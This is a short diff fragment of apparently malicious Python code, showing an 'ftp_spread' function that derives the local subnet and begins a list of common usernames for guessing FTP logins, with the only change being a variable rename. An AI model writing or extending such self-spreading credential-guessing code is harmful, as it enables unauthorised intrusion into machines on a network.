@@ -115,7 +115,7 @@ def start_http_server():
 def ftp_spread():
     try:
         local_ip = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0]
-        common_user = [
+        common_users = [
             'test',
             'abc123',
             'nic2212',
